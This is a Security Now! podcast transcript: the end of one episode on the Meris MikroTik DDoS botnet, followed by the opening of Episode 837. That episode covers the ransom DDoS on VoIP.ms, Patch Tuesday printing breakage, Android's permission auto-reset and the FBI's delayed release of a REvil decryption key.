But today we have such a large volume of vulnerable Internet appliances deployed globally that it's not necessary any longer to hide.  And these RPS (requests per second) attacks cannot be spoofed.  They're also dauntingly difficult to block because, as I said, each individual request is valid.  And it's only when a given IP makes too many requests within a short time that the client begins to look like it's probably a bot.  But think about that, like what you would need in order to block this.  You'd need to have something logging the IPs, counting each of the - and once upon a time in the quaint old days we only had 4.3 billion because it was a 32-bit number.  So you could easily lay out a big RAM map of counters and count up how many queries you were getting by IP, and the rate at which that was happening.  And at some point, if it hit a limit, you'd add that IP to the block list.



But now we have IPv6 and 128-bit IPs.  So you're going to need a data structure in order to arrange to determine the rate at which individual IPs, 128-bit IPs, are making queries, and you're going to have to answer a bunch of them because they might be valid until you decide that they're not.  I mean, and most people don't have any of this.  This is serious next-gen "protect yourself from the worst botnet that we've seen so far technology" that most sites don't have.  Which means anywhere this horrible thing is aimed is just dust.  Just poof, just gone from the Internet.  



LEO:  Just amazing.



STEVE:  Just a crater left behind with some lost bits in it.  So someone somewhere has built, assembled, and is in control of a horrifically powerful botnet, unlike anything seen before.  It consists of upwards of a quarter of a million MikroTik routers, nearly half of them with IP addresses in the United States.  And as I said, I'm sure those brief 60-second attacks against Yandex weren't meant to harm them.  They were meant to give the attackers some sense for the scale of this new offensive weapon they have created.  So they must be feeling quite pleased with themselves now.  Nothing can withstand 21 million web requests per second.



LEO:  And it still - the botnet still exists; right?  I mean, it's just a matter of where it's aimed next.



STEVE:  Yup.



LEO:  It's like the Death Star.  This has been a demonstration.



STEVE:  Yes.



LEO:  Wow.  Scary thought.  Is there a patch MikroTik's sent out?



STEVE:  Well, if you look at the distribution from their page of RouterOS versions, it's quite clear nobody ever...



LEO:  Nobody cares.



STEVE:  ...patches their MikroTik routers.  I mean, it looks like the entire history of - basically the RouterOS version that the device is sold with is the one that's running today.



LEO:  I think that's true for all routers.



STEVE:  Yes.



LEO:  I mean, we would hope for better, but I'm afraid that's true.



STEVE:  I know.  And so what that means is that somebody discovered a way of hacking a MikroTik router which has been vulnerable since day one and is vulnerable still.



LEO:  Yeah, because there are some recent versions, too; right?  I mean, it's not...



STEVE:  Yes, yes, yes.  The one before the current stable release is a vast number of infected machines.



LEO:  Golly.  



STEVE:  What's unfortunate is it's a shame that so much - think about the industry that's now going to have to go into providing protection from this.  So much complexity and cost is being added to what was originally a beautifully simple system, the IP-based Internet that we all love.  And it's all just to protect it from abuse.  And abuse aided not only by people who want to abuse, who are hiding behind anonymity because if they didn't have anonymity they'd just get arrested, and the Internet provides that to them also as a consequence of this technology.



LEO:  Oh, yeah.



STEVE:  But also unfortunately this is what I talked about when the other day somebody liked my quote and tweeted it back to me when I said "We are filling the world with a bunch of complex crap."



LEO:  Complex hackable crap.  But it just underscores why there aren't - people don't rob armored cars anymore, because why do something so high-risk when you can make big money without any risk at all?



STEVE:  You got doughnut crumbs there, Leo?



LEO:  Yeah, there's a few.  Gotta get the waiter in here with his special doughnut crumb cleaner.



STEVE:  No, but you're right.  Go cyber and go free.  



LEO:  It's unbelievable.  It's not, by any chance, one of those router exploits that you can reboot the router and clear out of memory?



STEVE:  Given that, I mean, well, okay.  How often are routers rebooted?



LEO:  Never, never.  I'm just saying, you remember the FBI put out an alert a few months ago saying everybody reboot your routers because...



STEVE:  Right.



LEO:  Maybe it was Mirai.  It could be wiped out of memory.



STEVE:  Well, you could almost imagine, like, some, again, science fiction, where we're going to turn off the global electricity.



LEO:  Ha ha ha, reboot everything.



STEVE:  Everything.  The only way to get out of this is we're going to shut down the world.  Everybody get out of your cars, turn those off because they're rolling computers now.



LEO:  That's hysterical.



STEVE:  We're going to turn off the power by universal agreement everywhere, probably not North Korea, but everywhere else.  Actually, I don't know...



LEO:  That would be a good movie.  You need to write that script.  That's great.  "The Day the Earth Went Dark."



STEVE:  "The Day the Earth Rebooted."



LEO:  Yeah, rebooted.  Reboot.  Project Reboot Earth.  I think that'll be - I'd go see that movie.  Wow.  Fascinating, as always.  By the way, I guess MikroTik is Latvian, which explains the reason for the use of Meris.  That's according to Jason Nash in our chatroom.



STEVE:  And you're right, I do remember that now that you say it.



LEO:  Yeah, that would explain it, yeah.  It would also explain why this affected Yandex more than, say - I mean, I know it's been seen elsewhere.  But it's Eastern Bloc kind of more.  I guess.



STEVE:  Yeah.  Well, you blast somebody complete into oblivion in New Zealand, and they're not going to be able to tell you, like, how much.  They're just going to be, like, what happened?



LEO:  Wha?  Something went wrong.  Something went terribly wrong.



STEVE:  Yeah, they're not counting packets.  They're trying to pour water on their servers.



LEO:  It really is kind of the Death Star of attacks.



STEVE:  Yes.



LEO:  It's pretty, you know, you're nuking it from space.  All right.  This show appears on your computer once a week, thanks to the great and generous Steve Gibson.  He's at GRC.com.  He has copies of the show on his server, 16Kb audio, 64Kb audio, and transcripts.  Go to GRC.com.  While you're there pick up a...



STEVE:  Ah.



LEO:  What?



STEVE:  It stands for Generous Research Corporation.



LEO:  The Generous Research Corporation.  I like it.  You also should pick up a copy of SpinRite, the world's best mass storage recovery and maintenance utility.  Current version 6.0; 6.1 is on its way.  The momentum is building, and you could participate in its development.  And you'll get a free copy, too, for that matter, if you go right now to GRC.com and buy yourself a copy of SpinRite.



We also have 64Kb audio and video at our site.  If you want to see Steve's shining face, all you have to do is go to TWiT.tv/sn.



STEVE:  My shining forehead.



LEO:  You can also get it on YouTube.  There's a YouTube channel devoted to Security Now!, and of course you can also get the podcast.  If you subscribe, you get it automatically.  Just subscribe in your favorite podcast client.  Do us a favor, though.  Spread the word.  Leave a five-star review so others know about the great resource that is Steve Gibson and Security Now!.



We do this show every Tuesday, right after MacBreak Weekly.  That's usually around 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  You can watch us do it live.  There are live audio and video streams at TWiT.tv/live.  People watching live like to chat live.  You can do that in two ways.  There's the free chat at irc.twit.tv.



Steve, have a wonderful week.  We'll see you next time on Security Now!.



STEVE:  Thank you, my friend.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#837

DATE:		September 21, 2021

TITLE:		Cobalt Strike 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-837.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine a devastating and still ongoing DDoS attack against the latest in a series of VoIP service providers.  We check out the once again mixed blessing of last Tuesday's Microsoft patches, and we examine a welcome feature of Android 11 that's being backported through Android 6.  We catch up with Chrome's patching of two more new zero-day vulnerabilities and attacks.  Then we look at a "pwnage" email I received from Troy Hunt's Have I Been Pwned site.  Was GRC pwned?  I then have a quick sci-fi reminder for the end of the week, a SpinRite update, and a fun related YouTube posting.  Then we'll wrap up by introducing the latest weapon in the malign perpetrator's arsenal, the powerful commercial tool known as Cobalt Strike.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We'll talk about one of the longest DDoS attacks ever - it's been going on for five days - who's behind it and what they are doing.  We'll also talk about Patch Tuesday's mixed blessing, the 10th, count them, 10th zero-day patch for Chrome this year alone.  And then a look at how a very powerful pentesting tool is being adapted by hackers to attack you.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 837, recorded Tuesday, September 21st, 2021:  Cobalt Strike.



It's time for Security Now!, the show where we cover your security, your privacy, your health, welfare, and wellbeing online with Steve Gibson of GRC.com.  Hi, Steve.



STEVE GIBSON:  Hey, Leo.  Great to be with you again.  This is our Tuesday after the second Tuesday, so we've got some news about how that went.  What's really interesting is that right now, as we're recording this, we're in the fifth day of a continuous, devastating, still ongoing DDoS attack against the latest in a series of several VoIP service providers.  So we're going to talk about that.  As I mentioned, we're going to also check in on how last Tuesday's Patch Tuesday went.  We've got some welcome feature of Android 11 that Google has announced they're backporting through to all the way back to Android 6.  But I'm a little unsure about exactly how that works.  We'll talk about that.



We catch up with Chrome's patching of two more new zero-day vulnerabilities and the attacks on those, being zero-days.  We look at the pwnage email I received from Troy Hunt's Have I Been Pwned site.  Was GRC pwned?  I then have a quick sci-fi reminder for the end of the week, a SpinRite update, and a fun related YouTube posting.  Then we're going to wrap up by introducing the latest weapon in the malign perpetrator's arsenal.  It is a powerful commercial tool known as Cobalt Strike, which unfortunately has been taken up rapidly by the underworld.  And since I'm seeing increasing mentions of it, I thought we ought to put Cobalt Strike on all of our listeners' radar so that when we touch on it in the future, as unfortunately I'm afraid we're going to be, everyone will be nodding sagely.  Ah, yes, Cobalt Strike.  We know about that from Episode 837.



LEO:  Picture of the Week time, Steve.



STEVE:  Indeed.  Okay.  So I figured after I saw this we had to share it, it was only fair, as a counterpoint to all of those horrifying and in many cases confounding wiring closet pictures that we were showing there for a while.  This is as far at the opposite end of that spectrum as you could find.  I titled this "Give that person a raise."  I can't describe...



LEO:  It's like a laced-up shoe.  There's bundles of - by the way, excellent choice in color.



STEVE:  Yes, very nice.



LEO:  They're kind of teal cables.



STEVE:  Yes.  And white plastic tie wraps.  They bundled...



LEO:  Perfectly spaced.



STEVE:  And circular, so the bundles are round.



LEO:  Yes.



STEVE:  And it's just - first one comes in on the top from the left.  Second one comes in, drops below it, goes to the right.  Third one comes in from the left again, slipping behind the second and the fourth.



LEO:  It's like lacing up a sneaker.  It's incredible.



STEVE:  It's just, like, first of all, this is not - whoever did this, this is not their first wrap-up of these things.



LEO:  No.  No.



STEVE:  I did note that it looks like it's coax as opposed to a multi-stranded Ethernet cable.  Looked at it really closely.  I think I'm seeing coax, like video terminations.  So I don't know what this is, but still.  You could certainly do this with standard 10Base-style Ethernet wiring, although I think this isn't.  But oh, just a beautiful piece of work.



LEO:  Yeah, this looks like a switcher, like the kind we use.



STEVE:  Yes.



LEO:  And, you know, I have to say, Russell does a pretty good job.  But this guy is definitely flexing.



STEVE:  It's world-class.  And, okay.  And notice that you don't even see the plastic bumps of the - well, okay.  There's one.



LEO:  They're over there.  But you don't - but he's made it behind...



STEVE:  There are generally, yes, he clearly deliberately rotated them so that they're behind the main vertical bundle.  It's just a piece of work.



LEO:  It looks like a competition, frankly.  It's pretty impressive, yeah.



STEVE:  It does.  It's like, yeah.  Maybe, yeah, I was going to say maybe you don't want to give the guy a raise because it may have taken about a year and a half.



LEO:  Uh-huh.



STEVE:  To put this thing together.  And it's like his boss is like, are you done with that thing yet?  No, sir.  I had to tear it all down and start over because we added a wire.  It's like...



LEO:  Oh, god, yeah. 



STEVE:  And that's, see, that's the lesson I learned is it's always fun to tie all this stuff down.  But it makes the installation brittle because you do need to move things around sometimes.



LEO:  Right, right.



STEVE:  And this is a little hostile to that.  So let's hope somehow they don't have to do that.



LEO:  I always use Velcro for that reason.



STEVE:  There you go.  Okay.  So the DDoS attack on VoIP.ms, that's their domain name.  After last week's podcast discussing the history, evolution, technology, and countermeasures of the Internet's denial of service attacks, many of our listeners tweeted to let me know of - this was later in the week, it began on Thursday - of an ongoing multiday attack against the company VoIP.ms.  And they are, as their name suggests, a Voice over IP provider whose website states has about 80,000 customers.  Okay, now, that was last Thursday.  Sadly, I don't know how many they have still.



Several of our listeners tweeted are among their customers.  I had some DM traffic going back and back saying, you know, who were telling me about this.  And I said, you know - and they were speaking in the DMs as if they had no phone service.  And indeed that is the case.  They were dark with their phone service.  So until last Thursday, VoIP's Twitter stream had occasionally posted an advertisement to discuss and promote the various benefits of Voice over IP services.  For example, on Monday, at the beginning of the week, on the 13th, they happily tweeted the rhetorical question:  "Are you looking for a proven growth lever for your business?  Are you making full use of cloud communications?  Read this article and discover all the advantages offered by this technology."  And then in their tweet they link to something.



So that was on the Monday.  On the 16th they tweeted, quote, and this is at the leading edge of this attack:  "We're aware" - they weren't aware yet of what.  They tweeted:  "We're aware of an issue that's keeping our customers to properly reach our website.  There's a team actively working on the issue as we speak.  And we expect it is fixed shortly.  Thanks for your patience."  So did somebody trip over a wire?  We don't know.



A bit later:  "We continue to work with our provider as our top priority, and we'll be ready to provide a post-mortem of this event once the service is reestablished.  Thanks for your kind understanding, and please stay tuned!"  And then:  "After further investigation, our service provider confirmed they are currently facing a network attack resulting in a denial of services.  For all practical purposes this is making our domain name, https://voip.ms, unreachable at the moment."  And then:  "For those of you who kindly switched from hostname to IP address and are within the U.S., we have made changes in the configuration with our upstream carriers to mitigate the issue for incoming calls, as well."



So they were beginning to play one of the games that people who - and as we know, I have too much experience with being on the receiving end of these things myself.  You know, one of the things you do is - this was back in the Verio days when they were my ISP.  I had a great relationship with them.  And so we changed GRC's IP address, and then changed DNS, which would propagate.  And for a while the attack would go away because it was still attacking the old IP.  But inevitably it would catch up with the change.  So, you know, changing IP addresses was one of the games back then.



They said in another tweet:  "If you need to access your customer portal, you may be able to do so by adding a DNS entry to your localhost."  And what they meant was your hosts file.  They said:  "Our public website and customer portal IP address is 173.231.187.61.  See detailed steps below on how to do this for a Windows Computer."  And then they provided instructions.



Okay.  So this attack continued without letup from Thursday throughout the weekend.  Then Monday, yesterday morning, they tweeted:  "We want to assure you that all our energy and resources are being put into fighting this ransom DDoS attack."  Which is the first time they made any reference to ransom.  A little after 11:30 a.m. yesterday, BleepingComputer, that was tracking this, posted some news.  They wrote:  "Threat actors are targeting voice-over-Internet Provider VoIP.ms with a DDoS attack and extorting the company to stop the assault that's severely disrupting the company's operation.  VoIP.ms is an Internet phone service company that provides affordable voice-over-IP service to businesses around the world.  On September 16th, 2021, VoIP.ms became the victim of a distributed denial-of-service attack targeting their infrastructure, including DNS name servers.



"As customers configured their VoIP equipment to connect to the company's domain name, the DDoS attack disrupted telephony services, preventing them from receiving or making phone calls.  As DNS was no longer working, the company advised customers to modify their hosts file to point the domain at their IP address to bypass DNS resolution.  However, this just led the threat actors to perform DDoS attacks directly at the IP address, as well.  To mitigate the attacks, VoIP.ms moved their website and DNS servers to Cloudflare.  And while they reported some success, the company's site and VoIP infrastructure still have issues due to the continued denial-of-service attack.



"An announcement posted to the VoIP.ms website says:  'A Distributed Denial of Service attack continues to be targeted at our websites and POP servers.'"  POP is Point of Presence, meaning the servers and services where they're delivering their VoIP.  They said:  "'Our team is deploying continuous efforts to stop this.  However the service is being intermittently affected.  We apologize for all the inconveniences.'  At the time of this writing, the site is bouncing back and forth between being accessible and displaying a 500 Internal Server Error.  Today, customers continue to experience issues with their telephone service, including loss of service, dropped calls, poor performance, and the inability to forward lines.



"On September 18th," BleepingComputer writes, "a threat actor using the name 'REvil' claimed responsibility for the attack and posted a link to a ransom note posted to Pastebin.  This ransom note has since been removed from Pastebin, but BleepingComputer was told it asked for one bitcoin, or approximately at the time 45,000 USD, to stop the DDoS attacks.  Soon after their original tweet, the threat actors raised their extortion demand to 100 bitcoins..."



LEO:  Oh, boy.



STEVE:  "...or approximately $4.3 million at the time."



LEO:  They realized what they had here.  Wow.



STEVE:  Uh-huh.  "The customers' responses to the attack against VoIP.ms have been mixed.  Some feel that VoIP.ms should pay the ransom to restore services before they themselves do not lose customers."  Meaning the customers of the companies who are using VoIP.ms's services.  "At the same time, other VoIP.ms customers are vowing to stick with them and telling the company not to give in to the ransom demand."  There's been lots of dialogue over on Reddit about this, with a lot of customers saying, you know, they give up.  They waited out the weekend.  They're jumping ship because, like, what's in it for them to stick around?  BleepingComputer has contacted VoIP.ms with questions regarding the attack, but has not received a reply.  And you can imagine the VoIP.ms folks have their hands full.  



It strongly appears also that this is only the most recent component of a larger campaign.  Earlier this month multiple VoIP providers in the U.K. were very similarly targeted.  The site Unified Communications, www.uctoday.com, posted the news of the DDoS attacks in the U.K. two weeks ago.  And I'm going to share what they wrote because everyone will note the similarities.



They wrote:  "At least three U.K. VoIP providers have been hit by a DDoS attack, according to the Cloud Communications Alliance (CCA).  In an email sent this morning, CCA said it has learned of a 'sophisticated, specific, and ongoing attack' believed to be from Russian cybercriminal organization REvil."  We'll talk about why I think this is not the case in a minute.  "Two providers revealed they were victims of the attack last week, but the third company was not named by CCA.  Poole-based Voip Unlimited said the attack on its core network started on August 31st and was continuous for 75 hours.  An update from this firm this morning said it did not observe any further attacks over the weekend.  London-based Voipfone reported its attack at the same time and said this morning that its services are fully operational, with traffic being closely monitored.  Both firms saw their services disrupted over a three-day period.



"CCA said that the culprits were demanding ransom, starting at one bitcoin, but quickly increasing.  The attack involves hammering a company's network with traffic of between 100 and 450 gigabits per second, often for up to 24 hours on multiple occasions.  It starts with an attack on IP addresses used for SIP ingress and egress, but then migrates to other services.  CCA said the attack is capable of evading some typical DDoS prevention measures.



"Voip Unlimited Managing Director Mark Pillow told The Register: 'At 2:00 p.m. 31st August, Voip Unlimited's network was the victim of an alarmingly large and sophisticated DDoS attack attached to a colossal ransom demand.  UK Comms Council have communicated to us that other U.K. SIP'" - SIP of course is Session Initiation Protocol, that's the VoIP protocol - "'providers are affected and identified them as a criminal hacking organization called REvil who appear to be undertaking planned and organized DDoS attacks against VoIP companies in the U.K.'"



Okay.  So here's what's interesting about this.  The RPS (Requests Per Second) attacks and their mitigations which we covered last week, which Cloudflare and others are able to provide, that is, mitigations to requests per second attacks, are extremely specific to filtering web requests being made by web browser clients.  In fact, anybody - sometimes when you go to a site behind Cloudflare, and I'm trying to think of several, but none jumps to mind.  Brian Krebs' site, for example.  You'll sometimes get like an intercept page which will say, you know, "One moment, verifying your browser."  And then you proceed to the site.



LEO:  Right.  We've all seen that a lot.  I just went to VoIP.ms's site, and you have to do a CAPTCHA, and it says hold on a second, blah blah blah.  But it's still up.



STEVE:  Okay.



LEO:  It's weird that they would attack the site and the POPs.  Those wouldn't be the same address.



STEVE:  Probably not.  Because the POPs - SIP is an HTTP-carried protocol, but not web.  It just uses the HTTP protocol.



LEO:  Right.  Right.



STEVE:  And what we did read was that the attacks do tend to hit their VoIP infrastructure first, and then I guess just to sort of annoy people.  Now, one reason of bringing down the web interface is that the customer portals, which is what they would use to migrate their service away, are web hosted.  So by attacking the provider's web interface, that would be preventing people from getting to their own client portals and thus moving themselves somewhere else.



Anyway, so the problem is that the protections that we have for the web-based request per second attacks, and you just talked about them, you know, having that odd intercept page which is no doubt running JavaScript on the browser in order to positively confirm that it is a web client that wants to connect, and not somebody just making bogus queries.  And especially if you had a CAPTCHA.  You know, there's yet again another mitigation up in front before you're able to proceed.  That would all be there to block a serious incoming attempt.  There is no provider of large-pipe VoIP protocol DDoS protection.  And that's the key.



So it has apparently dawned upon some miscreants somewhere that attacking the non-web servers of the Internet's global VoIP providers would be a new revenue source for extortion demands.  They're probably not wrong, unfortunately.  I agree with everyone that nothing about this sounds like the true REvil gang.  The REvil gang conducted themselves with some professionalism.  And first of all, you don't post an extortion demand, or REvil doesn't post it on Pastebin.  That's not the way REvil operates.  They also don't escalate from one bitcoin to 100.  That, again, this just - it sounds like...



LEO:  Amateurish, yeah.



STEVE:  Yeah.  It sounds like a group who are wanting to ride on REvil's name without in any other way being REvil.  And they've clearly got a big botnet.  There's no doubt about that.  They've got a significant botnet.  And unfortunately we are in a world now, as we talked about last week, where big botnets are not uncommon.  And what's occurred to them is that the anti-DDS defenses are not yet defending VoIP.  And you can imagine that there's lots of other Internet-based services that may be mission-critical for which there are not yet any specific attack preventions.



So I was curious about where we are today, this morning.  So I checked in with VoIP.ms's Twitter feed, and I found the following.  They said:  We want to assure you that all our energy and resources are being put into fighting this ransom DDoS attack.  We do feel grateful to count on your patience and understanding on these unfortunate events.  Please stay tuned on our social media feeds for further updates.  Thank you.  They said:  "Our entire team are working 24/7 on implementing all the required measures in order to have the service back up and running.  We definitely understand your current level of frustration; but please, due to the current circumstances, we can't disclose our action plan at this time.  Don't doubt we are definitely using all internal and external resources that can be used in situations like these; and that as soon as this event is over, your service will be just like you used it before the attacks."



And then they added and finished:  "All the team at https://VoIP.ms continues to work hard on recovering all services as soon as possible.  With the help of internal and external specialists, all efforts and" - okay, blah blah blah.  They said:  "Multiple changes have been applied in order to improve connectivity and reliability, and we have observed positive changes in certain areas of the service.  The following services have been recovered and are fully functional at the moment of this post:  SMS, MMS, Recordings, Call Recordings, Conference Recordings.  Please continue following our social media channels and issue tracker to not miss any important updates."



Okay.  So it sounds as though actual VoIP calling remains offline due to this attack.  They have messaging and playback of previous recorded audio working, but apparently not real-time interactive calling, five days downstream.  And of course 



the great danger to them is that VoIP services don't come with a great deal of customer lock-in.  So some percentage of their previous 80,000 customers, all of whom will have been without mission-critical VoIP services since last Thursday, may be unable to tolerate this outage and will port their numbers to another VoIP carrier.  I know that because it's all in the public transaction log.  There's a lot of conversation about this with people talking about who they went to and what they had to do to get there and blah blah blah.  So, I mean, they're losing customers as this attack goes on.



LEO:  It's exacerbated a little bit because it looks like they don't - they tout it anyway on their web page, no contract.  So if you're month-to-month, it's very easy to move on.



STEVE:  Yup.



LEO:  But I would guess for that reason it's - I don't know, but I would guess this is not a big enterprise VoIP solution.  This is probably used by a variety of people for something simpler.



STEVE:  Right.  Patched Tuesday's mixed blessing.  This being the third Tuesday of the month, as I mentioned at the top of the show, we're able to get some perspective on what last Tuesday's monthly Patch Tuesday wrought.  And "wrought" likely describes the mental state of at least a few of the industry's IT professionals following last Tuesday.  It occurred to me that the well-worn term "side effects" is apropos for labeling things that go wrong after one of Microsoft's monthly patch batches are installed.  Like a powerful pharmaceutical drug that a doctor prescribes, the application of the month's patch updates attempts to fix things that really do need to be fixed.  But also like so many powerful pharmaceuticals, there can often be unwanted side effects to make the patient, or the IT administrator, think twice before swallowing the pill.



On the "you really do need to take this pill" side, last week's batch of updates fixed a total of 86 vulnerabilities, two of them being zero-days being actively exploited ITW, which you may recall is our recently coined abbreviation - and we didn't coin it, the industry has - In The Wild.  The demographic breakdown of those was one denial of service vulnerability, two security feature bypass vulnerabilities, eight spoofing vulnerabilities, 11 information disclosure vulnerabilities, 16 remote code execution vulnerabilities, and 27 elevation of privilege vulnerabilities.



The biggest news was that, as we hoped would be true, Microsoft was indeed able to get that nasty MSHTML zero-day patched.  That was the one that the hacker forums were having a field day with, the one we talked about last week where an ActiveX control was embedded in an Office doc that could cause IE's sort of disconnected-but-still-present engine core to be invoked to download a malicious site's content and then compromise the system.  There was no terrific workaround because the weak workarounds that had been proposed had all been worked around.



So my advice and hope - I know.  My god.  My advice and hope was that Microsoft would be able - and I'm praying here, for those - I was off-camera.  I'll bring my praying hands up higher - was that Microsoft would be able to deal with that one swiftly.  And indeed they did.  Since then, we learned that the flaw was being used to download and execute a malicious DLL that in turn would install a - wait for it - Cobalt Strike Beacon, and we'll know by the end of this podcast exactly what that means, onto the victim's computer.



The Cobalt Strike Beacon allows bad guys to obtain remote access to the machine, allowing them to exfiltrate files and also to spread laterally throughout the network.  So in other words, this zero-day which was being exploited in the wild was being used to download the Cobalt Strike Beacon onto victims' machines.  Someone who just, like Pandora's inbox, said it really can't do any harm to just open one little Office document, can it?



Okay.  So all that's the good news.  And it provides sufficient reason for swallowing last week's update pill.  But as I noted, this month's treatment was not without its side effects, which are causing, believe it or not, many network printer users to gag.  The newly introduced trouble appears to be the result of Microsoft's attempt to resolve the last remaining outstanding, that is to say, still outstanding known vulnerability with their very troubled network printing management.  The so-called PrintNightmare vulnerability is/was, and perhaps is still, being tracked as CVE-2021-36958.  After applying last week's patches, which included a fix for 36958, Windows admins began reporting wide-scale network printing problems.  For example, from Microsoft's own forum under the subject "Print server and Print Nightmare update," there was a posting last week.  This just hit us this morning, too, 9/15/2021.  No one can print to the network printers.  I removed KB5005613 from our server and rebooted the server, and that fixed it.  Had to do that at all eight of our branch offices, too.  Microsoft updates...



LEO:  Oh, geez.



STEVE:  I know.  I know.  And this guy said:  "Microsoft updates seem to be more like hackers.  Not professional."  Somebody else wrote:  "Today, 16 September 2021, I got the same problem, cannot print to printer on the server.  Fortunately, I read this article and then I can assume that what happened to me is caused by BAD [all caps] Windows update.  Then I check Updates History and find one update installed on 15 September (security update KB5005565).  So I uninstall it and reboot and, YES [all caps], the printer works normally."  And there's others I have in the show notes.  I won't drag everyone across them.  But anyway, causing widespread problems.



So the trouble is rather widespread, and uninstalling that security update KB5005565 appears to be the only way - and I should mention that's a function of which specific version of Windows you've got.  The numbers vary depending upon Windows version.  So your mileage will vary.  That's the only way, uninstalling the relevant update, the only way to bring network printing back online.  But uninstalling the fix restores the vulnerability that was allowing bad guys to perform remote code execution and gain local system privileges.  The ransomware gangs Vice Society, Magniber, Conti are all known to have jumped onto this flaw and are now using it as long as it lasts - and apparently it's got another month, believe it or not - to obtain elevated privileges on compromised machines.



Which begs the question, how long will it last?  There's apparently no telling.  Remember that this remaining PrintNightmare vulnerability was originally reported privately to Microsoft back in December of 2020 by Victor Mata of FusionX, Accenture Security.  One hopes that we might see a permanent and working fix for this serious flaw before we get to this December, by which time Microsoft will have known of it for a full year.  A bitter pill to swallow, indeed.  And I keep coming back to the still-unanswered question:  Given Microsoft's virtually unlimited resources, how is it that they allow this to go on month after month after month?  I don't know.



Okay.  One last before we take a break and I get some water and catch my breath.  Android.  This is really welcome news.  But I'm a little puzzled by it.  Android to auto-reset app permissions on many more devices.  Last Friday, Google announced that later this year support for Android 11's privacy protection feature - which debuted a little over a year ago.  It was on September 8th of 2020.  Okay.  That feature proactively resets unneeded app permissions for applications that haven't been used in months.  That feature would be made available to billions - okay, potentially - of devices running older Android versions.  Or at least to any of those which are able to update their OS.



And this is great news.  Very much like having old and unneeded database information purge itself, which we wish database information did, but it doesn't, but auto-removing unneeded, and that is to say unused, permissions is obviously terrific security.  It's unfortunate that so many older Android devices may never be able to obtain this.  Google boasts of three billion devices running Android.  But the timeline demographics of their versions suggest that older versions are not rushing to update.



I grabbed a beautiful chart which is in the show notes, and the chart makes the trend clear.  Android 11's adoption is growing almost linearly, but maybe slowing down slightly as we'd expect.  But nearly all of its growth is coming from Android 10.  That is to say this chart, for those who don't see it - thanks, Leo, for putting it up - Android 11's adoption going up almost exactly mirrors Android 10's coming down.  Which tells us that Android 10 devices are being updated with Android 11.  The lines for Android 8 and 9, being the next two most recent versions, are drooping a little.  So they're being upgraded, presumably to 11.  But the older Androids are holding pretty firm.  And this is what we'd expect; right?



Now, in time the batteries of those increasingly decrepit Android devices will fail.  Or their radios will become obsolete as cellular technologies advance, and they're no longer able to find a cell tower that still supports 1G.  So they'll eventually be tossed into the recycle bin, and their components and precious metals will hopefully be reprocessed to make new gadgets.  But for those devices which can upgrade, this new and very useful feature will become available on all devices with Google Play services running Android from 6.0, which is API level 23, through Android 10.  That is, you know, 11 already has it.  So they're catching up:  6, 7, 8, 9, and 10.



In their posting, Google said:  "Starting in December 2021, we are expanding this to billions more devices.  This feature will automatically be enabled on devices with Google Play services that are running Android 6.0, API level 23 or higher.  On these devices, users can now go to the auto-reset settings page and enable/disable auto-reset for specific apps.  The system will start to automatically reset the permissions of unused apps a few weeks after the feature launches on a device."



Okay.  Now, I studied Google's announcement, and I came away unsure whether this would be enabled by default on older devices.  As we know, thanks to the tyranny of the default, the only thing that matters is whether this is enabled by default.  The reason this is confusing is that Google's announcement says, and I'm quoting them verbatim:  "This feature will automatically be enabled on devices with Google Play services that are running Android 6.0, API level 23 or higher.  The feature will be enabled by default" - okay.  So enabled on devices running Android 6.0 API level 23 or higher.  "The feature will be enabled by default for apps targeting Android 11, API level 30 or higher.  However, users can enable permission auto-reset manually for apps targeting API levels 23 through 29."  Which is to say prior to the API level prior to Android 11.



So this suggests that even when older devices are updated, their older apps, which might remain unaware of the new support offered by Android 11 at API level 30, would not automatically be enabled.  Presumably Google was unwilling to change this behavior without the user being aware.  But if I'm understanding this correctly, I think that was a mistake.  Just ask once for all older apps.  It certainly isn't burdensome for the user to say no, no, I want to leave things as they are.  That would not be unduly burdensome.  And it's the older devices that are most in need of having their security shored up.



So if I understand it right, I do wish Google had decided to be a little more intrusive.  But props to them in any event for adding this feature to Android.  As I said, eventually devices not running Android 11 will just disappear from the face of the Earth.  They'll just, you know, they won't be usable any longer.  And that'll be good because this idea of automatically downgrading the permission that you gave an app a long time ago that you haven't used, yay.  That's the way the world should work.



LEO:  Yeah.  I should point out that a lot of the older Android versions are running on things like coffee makers.  My toaster oven uses Android.  A lot of my appliances run on Android.



STEVE:  Good point.  Good point.



LEO:  I doubt they'll ever be updated.  And then I don't care for app privacy because I'm not running any apps.



STEVE:  Right, right.



LEO:  It's more security I worry about.  And again, they're not using a browser.  They're just, you know, it's just...



STEVE:  They're just being a little OS.



LEO:  Yeah, just a little OS.  Because it's free.  And so a lot of people do that.  Doesn't even have Google services on it, I'm sure.  We're going to take a break.  But before we do, I want to mention a story that broke this afternoon.  You haven't had time to see it.  The FBI apparently knew the REvil ransomware key for three weeks before telling anybody.  "The FBI refrained" - this is from The Washington Post, broke about noon today our time - "refrained for almost three weeks from helping to unlock the computers of hundreds of businesses and institutions hobbled by a major ransomware attack this summer."



STEVE:  Kaseya.



LEO:  "The Bureau had secretly obtained the digital key needed to do so, according to several current and former U.S. officials.  The key was obtained through access to the servers of the Russia-based criminal gang behind the July attack.  Deploying it immediately could have helped the victims avoid what analysts estimate was millions of dollars in recovery costs.  But the FBI held onto the key with the agreement of other agencies, in part because it was planning to carry out an operation to disrupt the hackers, a group known as REvil, and the Bureau did not want to tip them off.  Also a government assessment found the harm was not as severe as initially feared."  Tell that to the folks who paid the ransom.



STEVE:  Ooh.



LEO:  "The planned takedown never occurred because before the FBI could go after them, the hackers disappeared and shut down their server."  So you can't give FBI credit for doing it, but you can mention the fact that they knew for three weeks what the decryption key was.



STEVE:  Ouch.



LEO:  Yeah.  I'm sure you'll...



STEVE:  You know, there are those kinds of tough calls, right, where you learn something from a channel, but you have to protect the channel's identity.  So you can't make public what you've learned without endangering a resource that could potentially be even more vital in the future.



LEO:  The classic case is Enigma.



STEVE:  Yes.



